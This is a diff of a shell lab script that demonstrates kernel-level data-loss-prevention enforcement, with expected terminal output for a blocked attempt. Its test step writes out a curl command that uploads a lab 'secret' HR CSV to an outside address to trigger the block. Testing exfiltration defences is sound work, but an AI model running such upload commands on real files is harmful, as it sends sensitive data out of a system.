@@ -58,12 +58,13 @@ STEP
 
 hr "Step 3  trigger enforcement  (YOU run this, in terminal B)"
 cat <<'STEP'
-    # A single shell reads the secret (taints itself), then tries to exfil.
-    # The taint follows the process; the connect is denied in-kernel.
-    sudo sh -c 'cat /tmp/dlp-lab/secrets/hr.csv >/dev/null; curl -m 3 https://1.1.1.1'
+    # curl -T reads the secret AND connects in ONE process: file_open taints it,
+    # socket_connect then denies it. (Do NOT use `cat secret; curl` — cat taints
+    # only itself, a sibling of curl, so curl stays clean and is NOT blocked.)
+    curl -T /tmp/dlp-lab/secrets/hr.csv -m 5 https://1.1.1.1
 
     # Expected in terminal B:
-    #   curl: (7) ... Operation not permitted        <- kernel vetoed connect()
+    #   curl: (7) Failed to connect ... after 0 ms   <- kernel vetoed connect()
     # Expected in terminal A (the loader's audit stream):
     #   [DLP] BLOCK pid <N> exfil /tmp/dlp-lab/secrets/hr.csv (level 2)
     #   (a level-1 SSN-only file would ALERT-and-allow instead of BLOCK)
